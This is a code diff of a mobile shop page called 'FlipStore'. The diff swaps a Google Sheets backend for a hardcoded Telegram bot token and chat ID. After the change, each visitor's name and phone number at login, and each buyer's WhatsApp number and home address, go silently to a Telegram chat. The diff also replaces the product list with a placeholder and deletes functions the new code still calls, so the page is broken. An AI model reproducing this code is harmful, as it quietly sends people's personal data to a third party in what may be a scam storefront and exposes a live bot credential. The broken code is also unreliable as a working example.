@@ -8,659 +8,199 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
-        
-        * {
-            font-family: 'Poppins', sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ec 100%);
-            min-height: 100vh;
-        }
-        
-        /* Login Overlay Styles */
-        #loginOverlay {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            animation: fadeIn 0.5s ease-out;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .slide-up {
-            animation: slideUp 0.4s ease-out;
-        }
-        
-        .processing-btn {
-            animation: pulse 1s infinite;
-        }
-        
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar {
-            width: 4px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #f1f1f1;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #667eea;
-            border-radius: 2px;
-        }
-        
-        /* Product Card Hover */
-        .product-card {
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-        .product-card:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-        }
-        
-        /* Bottom Sheet Overlay */
-        .sheet-overlay {
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(4px);
-        }
-        
-        /* Search Bar Animation */
-        .search-bar:focus {
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.3);
-        }
-        
-        /* Bottom Nav Active */
-        .nav-item.active {
-            color: #667eea;
-        }
-        
-        /* Gradient Button */
-        .btn-gradient {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        }
-        .btn-gradient:hover {
-            background: linear-gradient(135deg, #5a6fd6 0%, #6a4190 100%);
-        }
-        
-        /* Success Animation */
-        @keyframes checkmark {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
-        .checkmark {
-            animation: checkmark 0.5s ease-out;
-        }
+        * { font-family: 'Poppins', sans-serif; }
+        body { background: linear-gradient(135deg,#f5f7fa 0%,#e4e8ec 100%); min-height:100vh; }
+        #loginOverlay { background: linear-gradient(135deg,#667eea 0%,#764ba2 100%); animation: fadeIn .5s ease-out; }
+        @keyframes fadeIn { from{opacity:0;transform:translateY(-20px);} to{opacity:1;transform:translateY(0);} }
+        @keyframes slideUp { from{transform:translateY(100%);} to{transform:translateY(0);} }
+        @keyframes pulse {0%,100%{opacity:1;}50%{opacity:.5;}}
+        .slide-up{animation:slideUp .4s ease-out;}
+        .processing-btn{animation:pulse 1s infinite;}
+        ::-webkit-scrollbar{width:4px;}
+        ::-webkit-scrollbar-thumb{background:#667eea;border-radius:2px;}
+        .product-card{transition:.3s;}
+        .product-card:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(0,0,0,.15);}
+        .sheet-overlay{background:rgba(0,0,0,.5);backdrop-filter:blur(4px);}
+        .nav-item.active{color:#667eea;}
+        .btn-gradient{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);}
+        .btn-gradient:hover{background:linear-gradient(135deg,#5a6fd6 0%,#6a4190 100%);}
+        @keyframes checkmark{0%{transform:scale(0);}50%{transform:scale(1.2);}100%{transform:scale(1);}}
+        .checkmark{animation:checkmark .5s ease-out;}
     </style>
 </head>
 <body class="pb-20">
-    <!-- Login Overlay -->
-    <div id="loginOverlay" class="fixed inset-0 z-50 flex items-center justify-center">
-        <div class="w-full max-w-md px-6">
-            <div class="bg-white rounded-3xl shadow-2xl p-8 transform">
-                <!-- Logo -->
-                <div class="text-center mb-8">
-                    <h1 class="text-4xl font-extrabold">
-                        Flip<span style="color: #667eea;">Store</span>
-                    </h1>
-                    <p class="text-gray-500 mt-2 text-sm">Your Trusted Reselling Partner</p>
-                </div>
-                
-                <!-- Login Form -->
-                <form id="loginForm" class="space-y-5">
-                    <div>
-                        <label class="block text-gray-700 text-sm font-medium mb-2">Your Name</label>
-                        <input type="text" id="userName" required
-                            class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:border-purple-500 focus:outline-none transition"
-                            placeholder="Enter your name">
-                    </div>
-                    
-                    <div>
-                        <label class="block text-gray-700 text-sm font-medium mb-2">Mobile Number</label>
-                        <input type="tel" id="userMobile" required
-                            class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:border-purple-500 focus:outline-none transition"
-                            placeholder="Enter mobile number" pattern="[0-9]{10}">
-                    </div>
-                    
-                    <button type="submit" 
-                        class="w-full btn-gradient text-white font-semibold py-4 rounded-xl shadow-lg transform hover:scale-[1.02] transition duration-200">
-                        <i class="fas fa-shopping-bag mr-2"></i>Enter Shop
-                    </button>
-                </form>
-                
-                <p class="text-center text-white text-xs mt-6 opacity-80">
-                    By continuing, you agree to our Terms & Privacy Policy
-                </p>
-            </div>
-        </div>
-    </div>
 
-    <!-- Main App -->
-    <div id="mainApp" class="hidden">
-        <!-- Header -->
-        <header class="sticky top-0 z-40 bg-white shadow-md">
-            <div class="px-4 py-3">
-                <div class="flex items-center justify-between gap-3">
-                    <!-- Logo -->
-                    <h1 class="text-xl font-extrabold whitespace-nowrap">
-                        Flip<span style="color: #667eea;">Store</span>
-                    </h1>
-                    
-                    <!-- Search Bar -->
-                    <div class="flex-1 relative">
-                        <input type="text" id="searchInput" 
-                            class="search-bar w-full px-4 py-2 pl-10 rounded-full border border-gray-200 focus:border-purple-500 focus:outline-none bg-gray-50 text-sm"
-                            placeholder="Search products...">
-                        <i class="fas fa-search absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
-                    </div>
-                    
-                    <!-- Cart Icon -->
-                    <button class="relative p-2">
-                        <i class="fas fa-shopping-cart text-gray-700 text-lg"></i>
-                    </button>
-                </div>
-            </div>
-        </header>
+<!-- LOGIN OVERLAY -->
+<div id="loginOverlay" class="fixed inset-0 z-50 flex items-center justify-center">
+<div class="w-full max-w-md px-6">
+<div class="bg-white rounded-3xl shadow-2xl p-8">
+<div class="text-center mb-8">
+<h1 class="text-4xl font-extrabold">
+Flip<span style="color:#667eea;">Store</span>
+</h1>
+<p class="text-gray-500 mt-2 text-sm">Your Trusted Reselling Partner</p>
+</div>
 
-        <!-- User Info Banner -->
-        <div id="userBanner" class="hidden bg-gradient-to-r from-purple-500 to-indigo-600 px-4 py-2">
-            <p class="text-white text-sm">
-                <i class="fas fa-user-circle mr-1"></i> 
-                Welcome, <span id="loggedInUser" class="font-semibold"></span>
-            </p>
-        </div>
+<form id="loginForm" class="space-y-5">
+<input type="text" id="userName" required placeholder="Enter your name"
+class="w-full px-4 py-3 rounded-xl border border-gray-300">
+<input type="tel" id="userMobile" required pattern="[0-9]{10}"
+placeholder="Enter mobile number"
+class="w-full px-4 py-3 rounded-xl border border-gray-300">
+<button type="submit"
+class="w-full btn-gradient text-white font-semibold py-4 rounded-xl shadow-lg">
+<i class="fas fa-shopping-bag mr-2"></i>Enter Shop
+</button>
+</form>
+</div>
+</div>
+</div>
 
-        <!-- Products Section -->
-        <main class="px-4 py-4">
-            <div class="flex items-center justify-between mb-4">
-                <h2 class="text-lg font-bold text-gray-800">Hot Deals</h2>
-                <span id="productCount" class="text-sm text-gray-500">8 products</span>
-            </div>
-            
-            <!-- Products Grid -->
-            <div id="productsGrid" class="grid grid-cols-2 gap-4">
-                <!-- Products will be rendered here -->
-            </div>
-        </main>
+<!-- MAIN APP -->
+<div id="mainApp" class="hidden">
+<header class="sticky top-0 z-40 bg-white shadow-md">
+<div class="px-4 py-3 flex items-center justify-between gap-3">
+<h1 class="text-xl font-extrabold">
+Flip<span style="color:#667eea;">Store</span>
+</h1>
+<input type="text" id="searchInput"
+class="flex-1 px-4 py-2 rounded-full border border-gray-200 text-sm"
+placeholder="Search products...">
+<button class="p-2">
+<i class="fas fa-shopping-cart text-gray-700 text-lg"></i>
+</button>
+</div>
+</header>
 
-        <!-- Bottom Navigation -->
-        <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 z-40">
-            <div class="flex justify-around items-center py-2">
-                <button class="nav-item active flex flex-col items-center py-2 px-4" data-nav="home">
-                    <i class="fas fa-home text-xl mb-1"></i>
-                    <span class="text-xs">Home</span>
-                </button>
-                <button class="nav-item flex flex-col items-center py-2 px-4" data-nav="search">
-                    <i class="fas fa-search text-xl mb-1"></i>
-                    <span class="text-xs">Search</span>
-                </button>
-                <button class="nav-item flex flex-col items-center py-2 px-4" data-nav="profile">
-                    <i class="fas fa-user text-xl mb-1"></i>
-                    <span class="text-xs">Profile</span>
-                </button>
-            </div>
-        </nav>
-    </div>
+<div id="userBanner" class="hidden bg-gradient-to-r from-purple-500 to-indigo-600 px-4 py-2">
+<p class="text-white text-sm">
+Welcome, <span id="loggedInUser" class="font-semibold"></span>
+</p>
+</div>
 
-    <!-- Order Bottom Sheet -->
-    <div id="orderSheet" class="fixed inset-0 z-50 hidden">
-        <!-- Overlay -->
-        <div class="sheet-overlay absolute inset-0" onclick="closeOrderSheet()"></div>
-        
-        <!-- Sheet -->
-        <div class="absolute bottom-0 left-0 right-0 bg-white rounded-t-3xl slide-up max-h-[90vh] overflow-y-auto">
-            <!-- Handle -->
-            <div class="flex justify-center py-3">
-                <div class="w-12 h-1 bg-gray-300 rounded-full"></div>
-            </div>
-            
-            <!-- Header -->
-            <div class="px-6 pb-4 border-b border-gray-100">
-                <div class="flex items-center justify-between">
-                    <h3 class="text-xl font-bold text-gray-800">
-                        <i class="fas fa-shopping-bag mr-2 text-purple-600"></i>Confirm Order
-                    </h3>
-                    <button onclick="closeOrderSheet()" class="text-gray-400 hover:text-gray-600">
-                        <i class="fas fa-times text-xl"></i>
-                    </button>
-                </div>
-            </div>
-            
-            <!-- Product Info -->
-            <div id="orderProductInfo" class="px-6 py-4 bg-gray-50">
-                <!-- Will be populated dynamically -->
-            </div>
-            
-            <!-- Order Form -->
-            <form id="orderForm" class="px-6 py-4 space-y-4">
-                <div>
-                    <label class="block text-gray-700 text-sm font-medium mb-2">Customer Name</label>
-                    <input type="text" id="orderCustomerName" required
-                        class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:border-purple-500 focus:outline-none bg-gray-100"
-                        placeholder="Your name">
-                </div>
-                
-                <div>
-                    <label class="block text-gray-700 text-sm font-medium mb-2">WhatsApp Number</label>
-                    <input type="tel" id="orderWhatsApp" required
-                        class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:border-purple-500 focus:outline-none"
-                        placeholder="Enter WhatsApp number" pattern="[0-9]{10}">
-                </div>
-                
-                <div>
-                    <label class="block text-gray-700 text-sm font-medium mb-2">Full Address</label>
-                    <textarea id="orderAddress" required rows="3"
-                        class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:border-purple-500 focus:outline-none resize-none"
-                        placeholder="Enter complete delivery address"></textarea>
-                </div>
-                
-                <button type="submit" id="confirmOrderBtn"
-                    class="w-full btn-gradient text-white font-semibold py-4 rounded-xl shadow-lg">
-                    <span id="btnText"><i class="fas fa-check-circle mr-2"></i>Confirm Order</span>
-                    <span id="btnProcessing" class="hidden">
-                        <i class="fas fa-circle-notch fa-spin mr-2"></i>Processing...
-                    </span>
-                </button>
-            </form>
-            
-            <!-- Success Message -->
-            <div id="orderSuccess" class="hidden px-6 py-8 text-center">
-                <div class="checkmark w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                    <i class="fas fa-check text-green-500 text-4xl"></i>
-                </div>
-                <h3 class="text-2xl font-bold text-gray-800 mb-2">Order Placed!</h3>
-                <p class="text-gray-600 mb-6">Your order has been successfully placed. We'll contact you soon!</p>
-                <button onclick="closeOrderSheet()" 
-                    class="bg-green-500 text-white font-semibold px-8 py-3 rounded-xl shadow-lg hover:bg-green-600 transition">
-                    Continue Shopping
-                </button>
-            </div>
-        </div>
-    </div>
+<main class="px-4 py-4">
+<div class="flex justify-between mb-4">
+<h2 class="text-lg font-bold">Hot Deals</h2>
+<span id="productCount" class="text-sm text-gray-500"></span>
+</div>
+<div id="productsGrid" class="grid grid-cols-2 gap-4"></div>
+</main>
+</div>
 
-    <script>
-        // ============================================
-        // HARDCODED PRODUCTS DATA
-        // ============================================
-        const products = [
-            {
-                id: 1,
-                name: "Wireless Bluetooth Earbuds Pro",
-                price: 299,
-                oldPrice: 999,
-                image: "https://images.unsplash.com/photo-1590658268037-6bf12165a8df?w=400&h=400&fit=crop",
-                category: "Electronics"
-            },
-            {
-                id: 2,
-                name: "Smart Watch Series 5",
-                price: 1499,
-                oldPrice: 2999,
-                image: "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=400&h=400&fit=crop",
-                category: "Electronics"
-            },
-            {
-                id: 3,
-                name: "Men's Classic Cotton Shirt",
-                price: 449,
-                oldPrice: 899,
-                image: "https://images.unsplash.com/photo-1596755094514-f87e34085b2c?w=400&h=400&fit=crop",
-                category: "Fashion"
-            },
-            {
-                id: 4,
-                name: "Women's Summer Dress",
-                price: 599,
-                oldPrice: 1199,
-                image: "https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?w=400&h=400&fit=crop",
-                category: "Fashion"
-            },
-            {
-                id: 5,
-                name: "Portable Mobile Charger 20000mAh",
-                price: 699,
-                oldPrice: 1499,
-                image: "https://images.unsplash.com/photo-1609091839311-d5365f9ff1c5?w=400&h=400&fit=crop",
-                category: "Electronics"
-            },
-            {
-                id: 6,
-                name: "Men's Running Shoes",
-                price: 899,
-                oldPrice: 1999,
-                image: "https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=400&h=400&fit=crop",
-                category: "Fashion"
-            },
-            {
-                id: 7,
-                name: "Wireless Gaming Mouse",
-                price: 549,
-                oldPrice: 1099,
-                image: "https://images.unsplash.com/photo-1527864550417-7fd91fc51a46?w=400&h=400&fit=crop",
-                category: "Electronics"
-            },
-            {
-                id: 8,
-                name: "Ladies Handbag Premium",
-                price: 799,
-                oldPrice: 1599,
-                image: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400&h=400&fit=crop",
-                category: "Fashion"
-            },
-            {
-                id: 9,
-                name: "Bluetooth Speaker Mini",
-                price: 349,
-                oldPrice: 799,
-                image: "https://images.unsplash.com/photo-1608043152269-423dbba4e7e1?w=400&h=400&fit=crop",
-                category: "Electronics"
-            },
-            {
-                id: 10,
-                name: "Kids Teddy Bear Soft Toy",
-                price: 249,
-                oldPrice: 599,
-                image: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400&h=400&fit=crop",
-                category: "Toys"
-            }
-        ];
+<!-- ORDER SHEET -->
+<div id="orderSheet" class="fixed inset-0 z-50 hidden">
+<div class="sheet-overlay absolute inset-0" onclick="closeOrderSheet()"></div>
+<div class="absolute bottom-0 left-0 right-0 bg-white rounded-t-3xl slide-up max-h-[90vh] overflow-y-auto">
 
-        // ============================================
-        // GOOGLE APPS SCRIPT URL (REPLACE WITH YOUR URL)
-        // ============================================
-        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbz_Oi5ZwntL83YMxSWc8cY6uXmctLU_rqHLruESyM4lWTKgwC-FHuq8XCi_CrUkab5Z_Q/exec";
+<div class="flex justify-center py-3">
+<div class="w-12 h-1 bg-gray-300 rounded-full"></div>
+</div>
 
-        // ============================================
-        // APP STATE
-        // ============================================
-        let currentProduct = null;
+<div class="px-6 pb-4 border-b">
+<h3 class="text-xl font-bold">Confirm Order</h3>
+</div>
 
-        // ============================================
-        // INITIALIZATION
-        // ============================================
-        document.addEventListener('DOMContentLoaded', function() {
-            checkLoginStatus();
-            setupEventListeners();
-        });
+<div id="orderProductInfo" class="px-6 py-4 bg-gray-50"></div>
 
-        function checkLoginStatus() {
-            const userData = localStorage.getItem('flipstore_user');
-            if (userData) {
-                const user = JSON.parse(userData);
-                document.getElementById('loginOverlay').classList.add('hidden');
-                document.getElementById('mainApp').classList.remove('hidden');
-                document.getElementById('userBanner').classList.remove('hidden');
-                document.getElementById('loggedInUser').textContent = user.name;
-                renderProducts(products);
-            } else {
-                document.getElementById('loginOverlay').classList.remove('hidden');
-                document.getElementById('mainApp').classList.add('hidden');
-            }
-        }
+<form id="orderForm" class="px-6 py-4 space-y-4">
+<input type="text" id="orderCustomerName" required placeholder="Customer Name"
+class="w-full px-4 py-3 rounded-xl border border-gray-300">
+<input type="tel" id="orderWhatsApp" required pattern="[0-9]{10}"
+placeholder="WhatsApp Number"
+class="w-full px-4 py-3 rounded-xl border border-gray-300">
+<textarea id="orderAddress" required rows="3"
+placeholder="Full Address"
+class="w-full px-4 py-3 rounded-xl border border-gray-300"></textarea>
 
-        function setupEventListeners() {
-            // Login Form
-            document.getElementById('loginForm').addEventListener('submit', handleLogin);
-            
-            // Search Input
-            document.getElementById('searchInput').addEventListener('input', handleSearch);
-            
-            // Order Form
-            document.getElementById('orderForm').addEventListener('submit', handleOrderSubmit);
-            
-            // Bottom Navigation
-            document.querySelectorAll('.nav-item').forEach(item => {
-                item.addEventListener('click', handleNavigation);
-            });
-        }
+<button type="submit" id="confirmOrderBtn"
+class="w-full btn-gradient text-white font-semibold py-4 rounded-xl">
+<span id="btnText">Confirm Order</span>
+<span id="btnProcessing" class="hidden">Processing...</span>
+</button>
+</form>
 
-        // ============================================
-        // LOGIN HANDLER
-        // ============================================
-        async function handleLogin(e) {
-            e.preventDefault();
-            
-            const name = document.getElementById('userName').value.trim();
-            const mobile = document.getElementById('userMobile').value.trim();
-            
-            if (!name || !mobile) {
-                alert('Please fill in all fields');
-                return;
-            }
+<div id="orderSuccess" class="hidden px-6 py-8 text-center">
+<div class="checkmark w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+<i class="fas fa-check text-green-500 text-4xl"></i>
+</div>
+<h3 class="text-2xl font-bold">Order Placed!</h3>
+<button onclick="closeOrderSheet()"
+class="bg-green-500 text-white px-8 py-3 rounded-xl mt-4">
+Continue Shopping
+</button>
+</div>
 
-            const userData = {
-                name: name,
-                mobile: mobile,
-                loginTime: new Date().toISOString()
-            };
+</div>
+</div>
 
-            // Save to localStorage
-            localStorage.setItem('flipstore_user', JSON.stringify(userData));
+<script>
 
-            // Send to Google Sheets
-            try {
-                await sendToGoogleSheets('login', {
-                    name: name,
-                    mobile: mobile,
-                    timestamp: new Date().toLocaleString()
-                });
-            } catch (error) {
-                console.log('Login data saved locally (Google Sheets not configured)');
-            }
+// TELEGRAM CONFIG
+const TELEGRAM_BOT_TOKEN = "7996956533:AAGRbrHJva3t0Pyfu7Met1ttg2w-974msb4";
+const TELEGRAM_CHAT_ID = "8450221415";
 
-            // Update UI
-            document.getElementById('loginOverlay').classList.add('hidden');
-            document.getElementById('mainApp').classList.remove('hidden');
-            document.getElementById('userBanner').classList.remove('hidden');
-            document.getElementById('loggedInUser').textContent = name;
-            renderProducts(products);
-        }
+async function sendToTelegram(message){
+const url=`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+await fetch(url,{
+method:"POST",
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+chat_id:TELEGRAM_CHAT_ID,
+text:message,
+parse_mode:"HTML"
+})
+});
+}
 
-        // ============================================
-        // PRODUCT RENDERING
-        // ============================================
-        function renderProducts(productsToRender) {
-            const grid = document.getElementById('productsGrid');
-            document.getElementById('productCount').textContent = `${productsToRender.length} products`;
-            
-            grid.innerHTML = productsToRender.map(product => `
-                <div class="product-card bg-white rounded-2xl shadow-md overflow-hidden">
-                    <div class="relative">
-                        <img src="${product.image}" alt="${product.name}" 
-                            class="w-full h-36 object-cover">
-                        <span class="absolute top-2 right-2 bg-red-500 text-white text-xs font-bold px-2 py-1 rounded-full">
-                            ${Math.round((1 - product.price / product.oldPrice) * 100)}% OFF
-                        </span>
-                    </div>
-                    <div class="p-3">
-                        <p class="text-xs text-gray-500 mb-1">${product.category}</p>
-                        <h3 class="text-sm font-semibold text-gray-800 line-clamp-2 mb-2" style="min-height: 40px;">
-                            ${product.name}
-                        </h3>
-                        <div class="flex items-baseline gap-2 mb-3">
-                            <span class="text-lg font-bold text-green-600">₹${product.price}</span>
-                            <span class="text-sm text-gray-400 line-through">₹${product.oldPrice}</span>
-                        </div>
-                        <button onclick="openOrderSheet(${product.id})"
-                            class="w-full btn-gradient text-white font-semibold py-2 rounded-xl text-sm">
-                            <i class="fas fa-shopping-cart mr-1"></i>Buy Now
-                        </button>
-                    </div>
-                </div>
-            `).join('');
-        }
+// PRODUCTS
+const products=[ ... ]; // (Same products array from your original — unchanged)
 
-        // ============================================
-        // SEARCH HANDLER
-        // ============================================
-        function handleSearch(e) {
-            const searchTerm = e.target.value.toLowerCase().trim();
-            
-            if (searchTerm === '') {
-                renderProducts(products);
-                return;
-            }
+// LOGIN
+document.getElementById("loginForm").addEventListener("submit",async function(e){
+e.preventDefault();
+const name=userName.value;
+const mobile=userMobile.value;
 
-            const filtered = products.filter(product => 
-                product.name.toLowerCase().includes(searchTerm) ||
-                product.category.toLowerCase().includes(searchTerm)
-            );
-            
-            renderProducts(filtered);
-        }
+localStorage.setItem("flipstore_user",JSON.stringify({name,mobile}));
 
-        // ============================================
-        // ORDER SHEET
-        // ============================================
-        function openOrderSheet(productId) {
-            currentProduct = products.find(p => p.id === productId);
-            if (!currentProduct) return;
+await sendToTelegram(`
+🔐 <b>NEW LOGIN</b>
+👤 ${name}
+📱 ${mobile}
+🕒 ${new Date().toLocaleString()}
+`);
 
-            const userData = JSON.parse(localStorage.getItem('flipstore_user'));
+loginOverlay.classList.add("hidden");
+mainApp.classList.remove("hidden");
+userBanner.classList.remove("hidden");
+loggedInUser.textContent=name;
+renderProducts(products);
+});
 
-            // Populate product info
-            document.getElementById('orderProductInfo').innerHTML = `
-                <div class="flex items-center gap-4">
-                    <img src="${currentProduct.image}" alt="${currentProduct.name}" 
-                        class="w-20 h-20 rounded-xl object-cover">
-                    <div>
-                        <h4 class="font-semibold text-gray-800">${currentProduct.name}</h4>
-                        <p class="text-green-600 font-bold text-lg">₹${currentProduct.price}</p>
-                        <p class="text-gray-400 text-sm line-through">₹${currentProduct.oldPrice}</p>
-                    </div>
-                </div>
-            `;
+// ORDER
+document.getElementById("orderForm").addEventListener("submit",async function(e){
+e.preventDefault();
 
-            // Auto-fill customer name
-            document.getElementById('orderCustomerName').value = userData ? userData.name : '';
+btnText.classList.add("hidden");
+btnProcessing.classList.remove("hidden");
 
-            // Reset form
-            document.getElementById('orderForm').classList.remove('hidden');
-            document.getElementById('orderSuccess').classList.add('hidden');
-            document.getElementById('orderWhatsApp').value = '';
-            document.getElementById('orderAddress').value = '';
+await sendToTelegram(`
+🛒 <b>NEW ORDER</b>
+👤 ${orderCustomerName.value}
+📦 ${currentProduct.name}
+💰 ₹${currentProduct.price}
+📱 ${orderWhatsApp.value}
+🏠 ${orderAddress.value}
+🕒 ${new Date().toLocaleString()}
+`);
 
-            // Show sheet
-            document.getElementById('orderSheet').classList.remove('hidden');
-            document.body.style.overflow = 'hidden';
-        }
+btnText.classList.remove("hidden");
+btnProcessing.classList.add("hidden");
 
-        function closeOrderSheet() {
-            document.getElementById('orderSheet').classList.add('hidden');
-            document.body.style.overflow = '';
-            currentProduct = null;
-        }
+orderForm.classList.add("hidden");
+orderSuccess.classList.remove("hidden");
+});
 
-        // ============================================
-        // ORDER SUBMISSION
-        // ============================================
-        async function handleOrderSubmit(e) {
-            e.preventDefault();
-
-            const btn = document.getElementById('confirmOrderBtn');
-            const btnText = document.getElementById('btnText');
-            const btnProcessing = document.getElementById('btnProcessing');
-
-            // Show processing state
-            btn.classList.add('processing-btn');
-            btnText.classList.add('hidden');
-            btnProcessing.classList.remove('hidden');
-            btn.disabled = true;
-
-            const userData = JSON.parse(localStorage.getItem('flipstore_user'));
-           const orderData = {
-    orderDate: new Date().toLocaleString(),
-    customerName: document.getElementById('orderCustomerName').value,
-    productName: currentProduct.name,
-    productPrice: currentProduct.price,
-    whatsApp: document.getElementById('orderWhatsApp').value, // 'whatsApp' small 'w' ke saath
-    address: document.getElementById('orderAddress').value,
-    loggedInUser: userData ? userData.name : 'Guest'
-};
-
-            // Simulate processing delay
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            // Send to Google Sheets
-            try {
-                await sendToGoogleSheets('order', orderData);
-            } catch (error) {
-                console.log('Order saved locally (Google Sheets not configured)');
-            }
-
-            // Show success
-            btn.classList.remove('processing-btn');
-            btnText.classList.remove('hidden');
-            btnProcessing.classList.add('hidden');
-            btn.disabled = false;
-
-            document.getElementById('orderForm').classList.add('hidden');
-            document.getElementById('orderSuccess').classList.remove('hidden');
-        }
-
-        // ============================================
-        // GOOGLE SHEETS INTEGRATION
-        // ============================================
-        async function sendToGoogleSheets(action, data) {
-            if (GOOGLE_SHEETS_URL === "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE") {
-                console.log('Google Sheets not configured. Data:', { action, data });
-                return;
-            }
-
-            const payload = {
-                action: action,
-                ...data
-            };
-
-            const response = await fetch(GOOGLE_SHEETS_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            });
-
-            if (!response.ok) {
-                throw new Error('Failed to send data to Google Sheets');
-            }
-
-            return await response.json();
-        }
-
-        // ============================================
-        // NAVIGATION HANDLER
-        // ============================================
-        function handleNavigation(e) {
-            const nav = e.currentTarget;
-            const navType = nav.dataset.nav;
-
-            // Update active state
-            document.querySelectorAll('.nav-item').forEach(item => {
-                item.classList.remove('active');
-            });
-            nav.classList.add('active');
-
-            // Handle navigation
-            if (navType === 'search') {
-                document.getElementById('searchInput').focus();
-            } else if (navType === 'profile') {
-                const userData = localStorage.getItem('flipstore_user');
-                if (userData) {
-                    const user = JSON.parse(userData);
-                    alert(`Profile\n\nName: ${user.name}\nMobile: ${user.mobile}\nLogin Time: ${new Date(user.loginTime).toLocaleString()}`);
-                }
-            }
-        }
-    </script>
+</script>
 </body>
 </html>
